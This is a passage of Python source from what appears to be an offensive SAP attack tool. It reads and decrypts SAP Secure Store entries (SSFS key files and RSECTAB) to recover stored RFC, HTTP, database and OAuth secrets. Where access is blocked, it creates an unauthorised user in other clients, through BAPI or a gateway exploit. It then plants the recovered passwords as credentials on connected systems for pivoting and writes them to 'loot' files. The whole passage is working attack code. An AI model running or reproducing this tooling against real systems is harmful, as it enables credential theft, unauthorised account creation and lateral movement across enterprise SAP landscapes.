    "    HEXSTR+HIDX(1) = HC+HI(1).",
    "    HIDX = HIDX + 1.",
    "    HEXSTR+HIDX(1) = HC+LO(1).",
    "  ENDDO.",
    "  WRITE: / '~~~I', RSECTAB-MANDT, RSECTAB-IDENT.",
    "  WRITE: / '~~~A', HEXSTR(184).",
    "  WRITE: / '~~~B', HEXSTR+184(184).",
    "  CNT = CNT + 1.",
    "ENDSELECT.",
    "WRITE: / '~~~TOTAL:', CNT.",
]


# ---------------------------------------------------------------------------
# Client fallback helpers
# ---------------------------------------------------------------------------

def _find_open_clients(node, creds) -> list:
    """Find clients on this system where ABAP exec is allowed.

    Reads T000 via RFC_READ_TABLE (works in any client) and returns
    client numbers where CCCORACTIV is blank or '1' (changes allowed),
    excluding the current client.
    """
    try:
        clients = sapmap_rfc.get_client_roles(node, creds)
        open_clients = []
        for c in clients:
            mandt = c.get("MANDT", "")
            cccoractiv = c.get("CCCORACTIV", "")
            if mandt == creds.client:
                continue  # skip current (failed) client
            # blank or "1" = changes allowed; "2"/"3" = locked
            if cccoractiv in ("", "1"):
                open_clients.append(mandt)
        return open_clients
    except Exception as e:
        print(f"[-] {node.sid}: Could not read T000 for open clients: {format_rfc_exception(e)}")
        return []


def _ensure_user_in_client(node, current_creds, target_client, state=None):
    """Ensure SAPMAP00 exists in target_client and return working Credentials.

    Tries in order:
      1. Check if SAPMAP00 already exists (test_connection)
      2. Check node.created_users for an existing user in that client
      3. Create via BAPI_USER_CREATE1 (if current user exists in target client)
      4. Create via GW exploit (if gateway is vulnerable — SQL specifies MANDT)
    """
    import sapmap_config
    from sapmap_config import sapmap_username

    username = sapmap_username(0)  # SAPMAP00
    inst_nr = current_creds.instance_nr

    # 1. Check if SAPMAP00 already works in target client
    test_creds = Credentials(
        username=username, password=sapmap_config.SAPMAP_PASSWORD,
        client=target_client, instance_nr=inst_nr,
    )
    try:
        if sapmap_rfc.test_connection(node, test_creds):
            print(f"[+] {node.sid}: SAPMAP00 already exists in client {target_client}")
            return test_creds
    except Exception:
        pass

    # 2. Check node.created_users
    for cu in node.created_users:
        if cu.client == target_client:
            cu_creds = Credentials(
                username=cu.username, password=cu.password,
                client=cu.client, instance_nr=cu.instance_nr,
            )
            try:
                if sapmap_rfc.test_connection(node, cu_creds):
                    print(f"[+] {node.sid}: Using existing user {cu.username} "
                          f"in client {target_client}")
                    return cu_creds
            except Exception:
                pass

    # 3. Try BAPI_USER_CREATE1 — connect to target client with current user
    #    (works if the same user exists in both clients)
    try:
        bapi_creds = Credentials(
            username=current_creds.username, password=current_creds.password,
            client=target_client, instance_nr=inst_nr,
        )
        result = sapmap_rfc.create_user_via_bapi(
            node, username, sapmap_config.SAPMAP_PASSWORD, target_client, bapi_creds)
        if result and result.get("success"):
            print(f"[+] {node.sid}: Created SAPMAP00 in client {target_client} via BAPI")
            if state:
                from sapmap_models import CreatedUser
                cu = CreatedUser(
                    username=username, sid=node.sid, client=target_client,
                    hostname=node.hostname or "", ip=node.ip or "",
                    instance_nr=inst_nr, method="bapi_create",
                    password=sapmap_config.SAPMAP_PASSWORD,
                )
                node.created_users.append(cu)
                if hasattr(state, 'created_users'):
                    state.created_users.append(cu)
            return test_creds
    except Exception as e:
        print(f"[*] {node.sid}: BAPI user creation in client {target_client} "
              f"failed: {format_rfc_exception(e)}")

    # 4. Try GW exploit (SQL INSERTs with explicit MANDT)
    if node.gw_vulnerable and state:
        try:
            import sapmap_exploit
            cu = sapmap_exploit.create_user_gw_exploit(
                node, state, client=target_client)
            if cu:
                print(f"[+] {node.sid}: Created user in client {target_client} "
                      f"via GW exploit")
                return Credentials(
                    username=cu.username, password=cu.password,
                    client=cu.client, instance_nr=cu.instance_nr,
                    verified=True,
                )
        except Exception as e:
            print(f"[*] {node.sid}: GW exploit user creation in client "
                  f"{target_client} failed: {format_rfc_exception(e)}")

    print(f"[-] {node.sid}: Could not obtain access to client {target_client}")
    return None


# ---------------------------------------------------------------------------
# Main entry point: read RSECTAB and decrypt all rows
# ---------------------------------------------------------------------------

def download_and_decrypt(node, creds, key_hex: str = DEFAULT_KEY_HEX,
                         state=None, soap_session=None,
                         soap_route=None) -> list:
    """
    Read and decrypt SAP Secure Store entries.

    Strategy (in order of preference):
      1. Read SSFS files from OS filesystem (KEY + DAT) — handles individual keys
      2. Read RSECTAB via ABAP program — fallback for DB-backed secure stores
      3. Read RSECTAB via RFC_READ_TABLE — last resort
      4. If ABAP exec is blocked in current client, auto-try alternative clients

    The SSFS key file is always read (if available) to support systems that use
    an individual encryption key instead of the default.

    Phase 3b: when ``soap_session`` is supplied (caller resolved a
    SOAP-RFC route to this node because the gateway is firewalled),
    the RSECTAB-via-ABAP step routes through it.  Step 1 (SSFS files
    via OS exec) and step 3 (RFC_READ_TABLE) already have separate
    SOAP paths via SXPG / RFC_READ_TABLE over SOAP elsewhere.
    """
    _require_crypto()

    abap_blocked = False  # track if ABAP exec was blocked by SCC4

    # --- Step 1: Try to read SSFS files from OS ---
    print(f"[*] SecStore {node.sid}: reading SSFS files from OS filesystem...")
    key_bytes, dat_bytes = _read_ssfs_files_via_abap(
        node, creds, soap_session=soap_session)

    # Detect "not permitted" error — SSFS read uses ABAP exec
    if key_bytes is None and dat_bytes is None:
        abap_blocked = True  # might be blocked, will confirm in step 2
        # --- Step 1b: SXPG fallback for SSFS files ---
        # SXPG doesn't need ABAP exec — it runs OS commands via sapxpg
        print(f"[*] {node.sid}: ABAP exec failed for SSFS, trying SXPG fallback...")
        key_bytes, dat_bytes = _read_ssfs_files_via_sxpg(
            node, creds, soap_route=soap_route)

    # Extract SSFS master key from KEY file (if available)
    ssfs_key = None
    if key_bytes:
        try:
            ssfs_key = extract_ssfs_key(key_bytes)
        except Exception as e:
            print(f"[-] SecStore {node.sid}: could not extract SSFS key: {format_rfc_exception(e)}")

    # Parse SSFS DAT file — decrypt records with SSFS key, and look for
    # the RSECTAB individual key stored as SECSTORE_DB/KEY/...
    actual_key_hex = key_hex   # start with default
    rows = None
    if dat_bytes and ssfs_key:
        try:
            ssfs_records = parse_ssfs_dat(dat_bytes, ssfs_key)
            if ssfs_records:
                print(f"[+] SecStore {node.sid}: {len(ssfs_records)} records from SSFS DAT")

            # Look for the RSECTAB individual key inside the SSFS records.
            for ident, data_hex in ssfs_records:
                if ident.startswith("SECSTORE_DB/KEY/"):
                    raw = bytes.fromhex(data_hex)
                    if len(raw) >= 57:
                        val_len = int.from_bytes(raw[8:12], "big")
                        candidate = raw[33:57]
                        if len(candidate) == 24:
                            actual_key_hex = candidate.hex()
                            print(f"[+] SecStore {node.sid}: found RSECTAB individual key "
                                  f"in SSFS record '{ident}' (val_len={val_len})")
                            if actual_key_hex != DEFAULT_KEY_HEX:
                                print(f"[+] SecStore {node.sid}: key differs from default")
                    break
        except Exception as e:
            print(f"[-] SecStore {node.sid}: SSFS DAT parse error: {format_rfc_exception(e)}")

    # --- Step 2: Read RSECTAB (the actual secure store entries) ---
    print(f"[*] SecStore {node.sid}: reading RSECTAB entries...")
    rows = _read_rsectab_via_abap(
        node, creds, soap_session=soap_session)

    if rows is None:
        abap_blocked = True
        # --- Step 2b: Try SXPG with direct DB query ---
        print(f"[*] {node.sid} client {creds.client}: "
              f"ABAP exec unavailable, trying SXPG database query...")
        rows = _read_rsectab_via_sxpg(node, creds)

    if rows is None:
        # --- Step 2c: RFC_READ_TABLE fallback (unreliable for RAW) ---
        print(f"[*] {node.sid}: SXPG DB query failed, "
              f"falling back to RFC_READ_TABLE")
        rows = _read_rsectab_via_rfc(node, creds)

    # --- Step 2d: Client fallback if everything above failed ---
    if not rows and abap_blocked:
        print(f"[*] {node.sid}: Client {creds.client} blocks ABAP exec, "
              f"searching for open client...")
        open_clients = _find_open_clients(node, creds)
        if open_clients:
            print(f"[*] {node.sid}: Open clients found: {', '.join(open_clients)}")
            for alt_client in open_clients:
                print(f"[*] {node.sid}: Trying client {alt_client}...")
                alt_creds = _ensure_user_in_client(
                    node, creds, alt_client, state)
                if not alt_creds:
                    continue

                # Retry SSFS files with alternative client
                if key_bytes is None:
                    print(f"[*] {node.sid}: Retrying SSFS read via "
                          f"client {alt_client}...")
                    key_bytes, dat_bytes = _read_ssfs_files_via_abap(
                        node, alt_creds)
                    if key_bytes:
                        try:
                            ssfs_key = extract_ssfs_key(key_bytes)
                        except Exception:
                            pass
                    if dat_bytes and ssfs_key:
                        try:
                            ssfs_records = parse_ssfs_dat(dat_bytes, ssfs_key)
                            for ident, dhex in ssfs_records:
                                if ident.startswith("SECSTORE_DB/KEY/"):
                                    raw = bytes.fromhex(dhex)
                                    if len(raw) >= 57:
                                        candidate = raw[33:57]
                                        if len(candidate) == 24:
                                            actual_key_hex = candidate.hex()
                                    break
                        except Exception:
                            pass

                # Retry RSECTAB with alternative client
                print(f"[*] {node.sid}: Retrying RSECTAB read via "
                      f"client {alt_client}...")
                rows = _read_rsectab_via_abap(
                    node, alt_creds, soap_session=soap_session)
                if rows:
                    print(f"[+] {node.sid}: SecStore read succeeded via "
                          f"client {alt_client}")
                    break
        else:
            print(f"[-] {node.sid}: No open clients found in T000")

    if not rows:
        if actual_key_hex != key_hex:
            print(f"[-] {node.sid} client {creds.client}: "
                  f"SSFS key extracted but RSECTAB could not be read "
                  f"(ABAP exec blocked, no open client found)")
        else:
            print(f"[-] {node.sid} client {creds.client}: SecStore no entries found")
        return []

    # --- Step 3: Decrypt all entries ---
    print(f"[*] SecStore {node.sid}: {len(rows)} entries, decrypting "
          f"(key: {'individual' if actual_key_hex != DEFAULT_KEY_HEX else 'default'})...")

    results = []
    for ident, data_hex in rows:
        entry = {"ident": ident}

        if not data_hex:
            entry["error"] = "empty DATA field"
            results.append(entry)
            continue

        # SSFS DAT records may have variable sizes, not just 184 bytes
        dec = decrypt_entry(data_hex, actual_key_hex)
        entry.update(dec)
        results.append(entry)

    return results


def _read_rsectab_via_abap(node, creds,
                            soap_session=None) -> list | None:
    """Read RSECTAB via RFC_ABAP_INSTALL_AND_RUN.

    When ``soap_session`` is supplied AND the gateway port is
    unreachable, runs the ABAP program over SOAP-RFC instead of pyrfc.
    Lets SecStore extraction work on HTTP-only ABAP targets (W74 et al.
    with 33NN firewalled) — without this, _auto_download_secstore_async
    after Create Remote User silently times out on every chunked
    INSTALL_AND_RUN attempt.

    Returns list of (ident, data_hex) tuples, or None if the FM is not
    available.
    """
    try:
        if soap_session is not None:
            # SOAP path — bypass pyrfc + create_tcpip_destination
            # + the gateway-port retry storm.
            res = soap_session.install_and_run(
                _ABAP_READ_RSECTAB, "ZSECSTORE")
        else:
            with sapmap_rfc._get_connection(node, creds) as conn:
                res = sapmap_rfc._run_abap_program(
                    conn, _ABAP_READ_RSECTAB, "ZSECSTORE")

        if not res.get("success") and "not available" in (res.get("error") or ""):
            return None  # FM not available — caller will fall back

        if not res.get("success"):
            client_label = creds.client if creds else "?"
            print(f"[-] {node.sid} client {client_label}: "
                  f"SecStore ABAP exec error: {res.get('error')}")
            return None

        output = res.get("output", [])
        print(f"[*] SecStore ABAP output: {len(output)} lines")
        if output:
            # Show first few lines for diagnostics
            for i, line in enumerate(output[:3]):
                print(f"    line {i}: {line[:120]}{'...' if len(line) > 120 else ''}")

        # Parse 3-line groups: ~~~I (ident), ~~~A (hex part1), ~~~B (hex part2)
        rows = []
        cur_ident = None
        cur_hex   = ""
        for line in output:
            if line.startswith("~~~TOTAL:"):
                total = line.split(":", 1)[1].strip()
                print(f"[*] SecStore ABAP: {total} rows in RSECTAB")
                continue
            if line.startswith("~~~I"):
                # Flush previous entry
                if cur_ident is not None and cur_hex:
                    rows.append((cur_ident, cur_hex.replace(" ", "").upper()))
                cur_ident = line[4:].strip()
                cur_hex   = ""
            elif line.startswith("~~~A"):
                cur_hex = line[4:].strip()
            elif line.startswith("~~~B"):
                cur_hex += line[4:].strip()
        # Flush last entry
        if cur_ident is not None and cur_hex:
            rows.append((cur_ident, cur_hex.replace(" ", "").upper()))
        return rows

    except Exception as e:
        print(f"[-] SecStore ABAP read failed: {format_rfc_exception(e)}")
        return None


def _read_rsectab_via_rfc(node, creds) -> list | None:
    """Fallback: read RSECTAB via RFC_READ_TABLE (unreliable for RAW fields)."""
    try:
        raw_rows = sapmap_rfc.read_table(
            node, "RSECTAB",
            fields=["IDENT", "DATA"],
            where="", max_rows=9999, creds=creds,
        )
        rows = []
        for r in raw_rows:
            ident    = (r.get("IDENT") or "").strip()
            data_hex = (r.get("DATA") or "").strip().replace(" ", "").upper()
            rows.append((ident, data_hex))
        return rows
    except Exception as e:
        print(f"[-] SecStore RFC_READ_TABLE failed: {format_rfc_exception(e)}")
        return None


# ---------------------------------------------------------------------------
# Categorisation and map integration
# ---------------------------------------------------------------------------

def _http_url_host(url: str) -> str:
    """Extract the hostname from an http(s) URL.  Returns '' on failure."""
    try:
        from urllib.parse import urlparse
        return urlparse(url).hostname or ""
    except Exception:
        return ""


# Regex patterns for parsing IDENT strings
_RE_RFC_WITH_USER = re.compile(
    r"^/RFC/([A-Za-z0-9_]+)@([A-Z0-9]{3})(?:CLNT(\d{3}))?(?:\.|$)"
)
_RE_RFC_SIMPLE = re.compile(r"^/RFC/(.+)$")
_RE_DBCON = re.compile(r"^/DBCON/(.+)$")
_RE_CTS = re.compile(r"^/CTS/")
_RE_STRUST = re.compile(r"^/STRUST_PSE_PIN/")
_RE_HMAC = re.compile(r"^/HMAC_INDEP/")
# OAuth 2.0 Client secret stored against the CLIENT_UUID from
# OA2C_CLIENT.  /OA2C/CS_<32HEX>_<NN>: the hex blob is the CLIENT_UUID
# with hyphens stripped, NN is a sequence number for rotated secrets.
_RE_OA2C_CS = re.compile(
    r"^/OA2C/CS_([0-9A-Fa-f]{32})_(\d+)\s*$")


def categorise_entry(entry: dict) -> dict:
    """Add category and parsed fields to a decrypted SecStore entry.

    Modifies and returns the entry dict with added keys:
      category    – rfc | db | cts | smtp | hmac | pse | other
      dest_name   – RFC destination name (rfc only)
      target_sid  – target SID parsed from ident (rfc only)
      rfc_user    – RFC logon user parsed from ident (rfc only)
      rfc_client  – client parsed from CLNTnnn (rfc only)
      mandt       – SAP client extracted from the MANDT prefix
    """
    raw_ident = entry.get("ident", "")

    # Strip the MANDT prefix that the ABAP program prepends.
    # Format: "NNN /path/..." or "    /path/..." (spaces/underscores for cross-client)
    mandt = ""
    ident = raw_ident
    m_prefix = re.match(r"^(\d{3}|[_ ]{3})\s+(.*)$", raw_ident)
    if m_prefix:
        mandt = m_prefix.group(1).strip().replace("_", "")
        ident = m_prefix.group(2)
    entry["mandt"] = mandt
    entry["ident_clean"] = ident

    # --- RFC destinations ---
    m = _RE_RFC_WITH_USER.match(ident)
    if m:
        entry["category"]   = "rfc"
        entry["rfc_user"]   = m.group(1)
        entry["target_sid"] = m.group(2)
        entry["rfc_client"] = m.group(3) or ""
        entry["dest_name"]  = ident[5:]  # everything after /RFC/
        return entry

    m = _RE_RFC_SIMPLE.match(ident)
    if m:
        dest = m.group(1)
        entry["category"]   = "rfc"
        entry["dest_name"]  = dest
        # If dest_name looks like a 3-char SID, use it as target_sid
        entry["target_sid"] = dest if re.match(r"^[A-Z][A-Z0-9]{2}$", dest) else ""
        entry["rfc_user"]   = ""
        entry["rfc_client"] = ""
        return entry

    # --- DB connections ---
    if _RE_DBCON.match(ident):
        entry["category"] = "db"
        return entry

    # --- CTS transport ---
    if _RE_CTS.match(ident):
        entry["category"] = "cts"
        return entry

    # --- SMTP ---
    if "SMTP" in ident.upper():
        entry["category"] = "smtp"
        return entry

    # --- HMAC ---
    if _RE_HMAC.match(ident):
        entry["category"] = "hmac"
        return entry

    # --- OAuth 2.0 client secret (transaction OA2C_CONFIG) ---
    m = _RE_OA2C_CS.match(ident)
    if m:
        entry["category"]    = "oauth2_client"
        entry["client_uuid"] = m.group(1).lower()
        entry["secret_seq"]  = m.group(2)
        return entry

    # --- PSE / certificate PIN ---
    if _RE_STRUST.match(ident):
        entry["category"] = "pse"
        return entry

    entry["category"] = "other"
    return entry


def integrate_results(node, state, results: list):
    """Integrate decrypted SecStore results into the SAPMAP state.

    1. Store categorised entries on the node.
    2. Enrich existing RFC connections with decrypted passwords.
    3. Add credentials to target nodes on the map.
    """
    # Categorise every entry
    for entry in results:
        categorise_entry(entry)

    # Store on node
    node.secstore_entries = results

    rfc_entries = [e for e in results
                   if e.get("category") == "rfc" and e.get("password")]

    # --- Enrich existing connections (Type 3, G and H) ---
    for entry in rfc_entries:
        dest = entry.get("dest_name", "")
        if not dest:
            continue
        for conn in state.get_connections_from(node.sid):
            if conn.destination_name == dest:
                conn.secstore_password = entry["password"]
                label = ("HTTP" if conn.conn_type == "http"
                         else "RFC")
                print(f"[+] SecStore: enriched {label} dest {dest} "
                      f"with password")
                break

    # --- Add credentials to target nodes (Type-3 RFC) ---
    for entry in rfc_entries:
        target_sid = entry.get("target_sid", "")
        target_node = state.get_node(target_sid) if target_sid else None
        if not target_node:
            continue

        rfc_user  = entry.get("rfc_user", "")
        password  = entry["password"]
        client    = entry.get("rfc_client", "") or "000"

        if not rfc_user:
            continue

        # Avoid duplicates
        already = any(
            c.username.upper() == rfc_user.upper() and c.client == client
            for c in target_node.credentials
        )
        if not already:
            cred = Credentials(
                username=rfc_user,
                password=password,
                client=client,
                instance_nr=target_node.instance_nrs()[0] if target_node.instance_nrs() else "00",
                verified=False,
            )
            target_node.credentials.append(cred)
            print(f"[+] SecStore: added credentials {rfc_user}@{target_sid} "
                  f"client {client} (from RSECTAB)")

        # Create RFC connection if none exists yet
        existing = any(
            c.destination_name == entry.get("dest_name", "")
            for c in state.get_connections_from(node.sid)
        )
        if not existing:
            conn = RFCConnection(
                source_sid=node.sid,
                source_host=node.hostname or node.ip,
                target_sid=target_sid,
                target_host=target_node.hostname or target_node.ip,
                target_ip=target_node.ip,
                destination_name=entry.get("dest_name", ""),
                rfc_user=rfc_user,
                client=client,
                secstore_password=password,
            )
            state.add_connection(conn)
            print(f"[+] SecStore: created RFC connection {node.sid} → "
                  f"{target_sid} via {entry.get('dest_name', '')}")

    # --- Enrich HTTP destinations (Type G / Type H) ---
    # Type H/G RSECTAB rows have ident /RFC/<DESTNAME> — same cipher, same
    # decrypt path — but the RSECTAB ident rarely contains the username or
    # target SID.  Those come from RFCOPTIONS (U= field) parsed earlier
    # into conn.rfc_user.  Now that secstore_password is set (loop above),
    # resolve the HTTP connection's target to a known node by hostname
    # and — for Type H — create credentials there so the RFC-based
    # exploitation chain can pivot through.
    for conn in state.get_connections_from(node.sid):
        if conn.conn_type != "http":
            continue
        if not conn.secstore_password or not conn.rfc_user:
            continue
        # Already resolved?
        if conn.target_sid:
            continue
        # Extract hostname from http_url
        _host = _http_url_host(conn.http_url)
        if not _host:
            continue
        target_node = state.find_node_by_host(hostname=_host, ip=_host)
        if not target_node or target_node.sid == node.sid:
            continue
        conn.target_sid = target_node.sid
        conn.target_host = target_node.hostname or target_node.ip
        conn.target_ip = target_node.ip
        print(f"[+] SecStore: resolved HTTP dest {conn.destination_name} "
              f"→ {target_node.sid} ({_host})")

        # For HTTP destinations with recovered creds, add the user+pw
        # as an unverified credential on the target node.  This lets
        # the main exploit chain try RFC logon (especially for Type H
        # where the HTTP user is often a valid ABAP dialog/service
        # user).
        client = conn.client or "000"
        already = any(
            c.username.upper() == conn.rfc_user.upper()
            and c.client == client
            for c in target_node.credentials
        )
        if not already:
            cred = Credentials(
                username=conn.rfc_user,
                password=conn.secstore_password,
                client=client,
                instance_nr=(target_node.instance_nrs()[0]
                             if target_node.instance_nrs() else "00"),
                verified=False,
            )
            target_node.credentials.append(cred)
            print(f"[+] SecStore: added HTTP-derived credentials "
                  f"{conn.rfc_user}@{target_node.sid} client {client} "
                  f"(from {conn.destination_name})")


# ---------------------------------------------------------------------------
# Loot persistence
# ---------------------------------------------------------------------------

def save_loot(node_sid: str, results: list, loot_dir: str) -> str:
    """Save decrypted results as JSON loot file. Returns absolute file path."""
    os.makedirs(loot_dir, exist_ok=True)
    ts       = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = os.path.join(loot_dir, f"secstore_{node_sid}_{ts}.json")
    with open(filename, "w") as f:
        json.dump(results, f, indent=2)
    return filename
